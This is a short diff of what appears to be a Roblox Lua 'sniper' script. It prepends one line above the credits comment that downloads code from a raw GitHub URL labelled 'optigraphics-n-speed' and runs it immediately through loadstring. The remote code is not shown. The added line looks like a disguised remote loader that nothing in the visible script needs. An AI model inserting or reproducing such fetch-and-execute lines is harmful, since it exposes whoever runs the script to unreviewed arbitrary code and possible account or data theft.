@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/isoantii/optigraphics-n-speed/main/opti"))()
 --[[
 Credits List
 ethereum: creating the base sniper
